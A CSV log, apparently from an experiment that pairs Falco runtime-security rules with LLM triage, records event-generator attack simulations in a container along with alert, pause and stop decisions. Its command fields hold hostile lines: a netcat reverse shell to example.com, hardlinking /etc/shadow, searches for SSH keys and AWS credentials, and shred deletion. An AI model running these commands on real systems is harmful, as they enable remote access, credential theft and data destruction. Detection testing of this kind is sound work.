timestamp,event_type,rule_name,priority,prompt_tokens,completion_tokens,latency_ms,remediation_status,remediation_action,mitre_technique,target_container,attack_source,attack_label,attack_id,container_id,container_image,event_source,experiment_mode,ground_truth,rule_matched,llm_called,cache_hit,cache_key,gate_decision,llm_action,llm_threat_level,cache_ttl
2026-05-17T13:06:50.015320,cache-hit,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,357658d27e05316e491368365302d386,cache-hit,alert,medium,300
2026-05-17T13:06:51.596103,cache-hit,Create Symlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-1807769247/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,aa21b1177c801979bea62a239e056977,cache-hit,pause,medium,300
2026-05-17T13:06:53.175535,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:06:54.756064,cache-hit,Packet socket created in container,Notice,0,0,0,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,50444a11263ba4bdc942b447dce33e70,cache-hit,alert,medium,300
2026-05-17T13:06:56.337424,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:06:57.928967,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:06:59.511531,cache-hit,Fileless execution via memfd_create,Critical,0,0,0,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ed1d903fc003a9a58bc1a53dc4c8ee7d,cache-hit,alert,high,300
2026-05-17T13:07:01.089536,cache-hit,Create Hardlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-1864564634/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ce29cc75814d17294a676363d10f7622,cache-hit,alert,medium,300
2026-05-17T13:07:02.668691,cache-hit,System user interactive,Informational,0,0,0,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,256d745947e9b7d7eae333d0ebd169e3,cache-hit,pause,high,300
2026-05-17T13:07:04.247571,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:07:05.828921,cache-hit,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,1e39dfc23dcf83ae7a47a9666599847c,cache-hit,alert,medium,300
2026-05-17T13:07:07.408221,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:07:08.987206,cache-hit,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,3a08e749a190242c74492afdfc1de468,cache-hit,stop,medium,300
2026-05-17T13:07:10.566380,cache-hit,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6b25374d77be2bccc3489c6473bdb223,cache-hit,alert,medium,300
2026-05-17T13:07:12.155992,cache-hit,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,1e39dfc23dcf83ae7a47a9666599847c,cache-hit,alert,medium,300
2026-05-17T13:07:13.736823,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:07:15.315921,cache-hit,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,3a08e749a190242c74492afdfc1de468,cache-hit,stop,medium,300
2026-05-17T13:07:16.894232,cache-hit,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6b25374d77be2bccc3489c6473bdb223,cache-hit,alert,medium,300
2026-05-17T13:07:18.477367,cache-hit,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b7d41082564995db77d6b74b75a4f3d2,cache-hit,alert,high,300
2026-05-17T13:07:20.056364,cache-hit,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,629494c6c6d948ac631c427d8d609862,cache-hit,alert,high,300
2026-05-17T13:07:21.635818,cache-hit,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b95c830e335267463f9a43857f2ed885,cache-hit,pause,medium,300
2026-05-17T13:07:23.217291,cache-hit,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-1056880682,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6c972ecf189eefa9be9e4d28f665b944,cache-hit,alert,medium,300
2026-05-17T13:07:24.820974,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-q7s62N.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,300
2026-05-17T13:07:26.401397,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-q7s62N.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,300
2026-05-17T13:07:27.979833,cache-hit,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,357658d27e05316e491368365302d386,cache-hit,alert,medium,300
2026-05-17T13:07:29.558967,cache-hit,Create Symlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-685563460/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,aa21b1177c801979bea62a239e056977,cache-hit,pause,medium,300
2026-05-17T13:07:31.138489,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:07:32.718017,cache-hit,Packet socket created in container,Notice,0,0,0,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,50444a11263ba4bdc942b447dce33e70,cache-hit,alert,medium,300
2026-05-17T13:07:34.297373,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:07:35.876343,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:07:37.457794,cache-hit,Fileless execution via memfd_create,Critical,0,0,0,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ed1d903fc003a9a58bc1a53dc4c8ee7d,cache-hit,alert,high,300
2026-05-17T13:07:39.036037,cache-hit,Create Hardlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-861507121/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ce29cc75814d17294a676363d10f7622,cache-hit,alert,medium,300
2026-05-17T13:07:40.626004,cache-hit,System user interactive,Informational,0,0,0,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,256d745947e9b7d7eae333d0ebd169e3,cache-hit,pause,high,300
2026-05-17T13:07:42.204741,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:07:43.783543,cache-hit,Packet socket created in container,Notice,0,0,0,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,50444a11263ba4bdc942b447dce33e70,cache-hit,alert,medium,300
2026-05-17T13:07:45.365874,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:07:46.944655,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:07:48.527147,cache-hit,Fileless execution via memfd_create,Critical,0,0,0,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ed1d903fc003a9a58bc1a53dc4c8ee7d,cache-hit,alert,high,300
2026-05-17T13:07:50.106662,cache-hit,Create Hardlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3659591051/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ce29cc75814d17294a676363d10f7622,cache-hit,alert,medium,300
2026-05-17T13:07:51.685894,cache-hit,System user interactive,Informational,0,0,0,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,256d745947e9b7d7eae333d0ebd169e3,cache-hit,pause,high,300
2026-05-17T13:07:53.263658,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:07:54.842965,cache-hit,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,1e39dfc23dcf83ae7a47a9666599847c,cache-hit,alert,medium,300
2026-05-17T13:07:56.432745,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:07:58.011078,cache-hit,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,3a08e749a190242c74492afdfc1de468,cache-hit,stop,medium,300
2026-05-17T13:07:59.590284,cache-hit,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6b25374d77be2bccc3489c6473bdb223,cache-hit,alert,medium,300
2026-05-17T13:08:01.169704,cache-hit,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b7d41082564995db77d6b74b75a4f3d2,cache-hit,alert,high,300
2026-05-17T13:08:02.747968,cache-hit,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,629494c6c6d948ac631c427d8d609862,cache-hit,alert,high,300
2026-05-17T13:08:04.325958,cache-hit,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b95c830e335267463f9a43857f2ed885,cache-hit,pause,medium,300
2026-05-17T13:08:05.906380,cache-hit,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3977651963,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6c972ecf189eefa9be9e4d28f665b944,cache-hit,alert,medium,300
2026-05-17T13:08:07.488273,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-D0PiMF.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,300
2026-05-17T13:08:09.067395,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-D0PiMF.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,300
2026-05-17T13:08:10.656230,cache-hit,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,357658d27e05316e491368365302d386,cache-hit,alert,medium,300
2026-05-17T13:08:12.236063,cache-hit,Create Symlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-4097235232/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,aa21b1177c801979bea62a239e056977,cache-hit,pause,medium,300
2026-05-17T13:08:13.815011,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:08:15.394784,cache-hit,Create Hardlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3611764846/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ce29cc75814d17294a676363d10f7622,cache-hit,alert,medium,300
2026-05-17T13:08:16.975395,cache-hit,System user interactive,Informational,0,0,0,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,256d745947e9b7d7eae333d0ebd169e3,cache-hit,pause,high,300
2026-05-17T13:08:18.555159,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:08:20.135645,cache-hit,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,1e39dfc23dcf83ae7a47a9666599847c,cache-hit,alert,medium,300
2026-05-17T13:08:21.715045,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:08:23.294661,cache-hit,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,3a08e749a190242c74492afdfc1de468,cache-hit,stop,medium,300
2026-05-17T13:08:24.874378,cache-hit,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6b25374d77be2bccc3489c6473bdb223,cache-hit,alert,medium,300
2026-05-17T13:08:26.470751,cache-hit,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b7d41082564995db77d6b74b75a4f3d2,cache-hit,alert,high,300
2026-05-17T13:08:28.051008,cache-hit,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,629494c6c6d948ac631c427d8d609862,cache-hit,alert,high,300
2026-05-17T13:08:29.629848,cache-hit,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b95c830e335267463f9a43857f2ed885,cache-hit,pause,medium,300
2026-05-17T13:08:31.208451,cache-hit,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3880705581,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6c972ecf189eefa9be9e4d28f665b944,cache-hit,alert,medium,300
2026-05-17T13:08:32.788371,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-1qET8z.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,300
2026-05-17T13:08:34.368816,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-1qET8z.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,300
2026-05-17T13:08:35.946994,cache-hit,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,357658d27e05316e491368365302d386,cache-hit,alert,medium,300
2026-05-17T13:08:37.529214,cache-hit,Create Symlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-3368901967/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,aa21b1177c801979bea62a239e056977,cache-hit,pause,medium,300
2026-05-17T13:08:39.108866,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:08:40.699225,cache-hit,Packet socket created in container,Notice,0,0,0,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,50444a11263ba4bdc942b447dce33e70,cache-hit,alert,medium,300
2026-05-17T13:08:42.278850,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:08:43.857909,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:08:45.438170,cache-hit,Fileless execution via memfd_create,Critical,0,0,0,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ed1d903fc003a9a58bc1a53dc4c8ee7d,cache-hit,alert,high,300
2026-05-17T13:08:47.017687,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:08:48.596983,cache-hit,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,3a08e749a190242c74492afdfc1de468,cache-hit,stop,medium,300
2026-05-17T13:08:50.176019,cache-hit,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6b25374d77be2bccc3489c6473bdb223,cache-hit,alert,medium,300
2026-05-17T13:08:51.756290,cache-hit,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b7d41082564995db77d6b74b75a4f3d2,cache-hit,alert,high,300
2026-05-17T13:08:53.334144,cache-hit,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,629494c6c6d948ac631c427d8d609862,cache-hit,alert,high,300
2026-05-17T13:08:54.913100,cache-hit,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b95c830e335267463f9a43857f2ed885,cache-hit,pause,medium,300
2026-05-17T13:08:56.507117,cache-hit,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-1986643590,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6c972ecf189eefa9be9e4d28f665b944,cache-hit,alert,medium,300
2026-05-17T13:08:58.085414,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-x5wTtX.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,300
2026-05-17T13:08:59.666208,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-x5wTtX.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,300
2026-05-17T13:09:01.246095,cache-hit,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,357658d27e05316e491368365302d386,cache-hit,alert,medium,300
2026-05-17T13:09:02.825244,cache-hit,Create Symlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-1669706002/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,aa21b1177c801979bea62a239e056977,cache-hit,pause,medium,300
2026-05-17T13:09:04.404189,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,300
2026-05-17T13:09:05.982730,cache-hit,Packet socket created in container,Notice,0,0,0,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,50444a11263ba4bdc942b447dce33e70,cache-hit,alert,medium,300
